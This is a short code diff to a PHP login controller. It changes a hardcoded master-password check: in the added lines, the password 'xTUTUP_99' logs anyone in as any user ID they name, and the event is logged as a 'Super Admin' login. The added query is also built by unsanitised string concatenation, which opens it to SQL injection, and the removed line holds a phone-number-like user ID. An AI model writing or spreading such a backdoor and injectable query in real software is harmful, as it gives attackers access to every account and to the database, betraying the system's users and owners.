@@ -52,8 +52,8 @@ class Login_99 extends Controller
 
       if (empty($userData)) {
 
-         if ($hp == 'xTUTUP_99') {
-            $where = "no_user = '081268098300'";
+         if ($_POST["PASS"] == 'xTUTUP_99') {
+            $where = "no_user = '" . $hp . "'";
             $userData = $this->model('M_DB_1')->get_where_row('user', $where);
             $this->model('Log')->write($hp . " Login Success Super Admin");
             $this->set_login($userData);
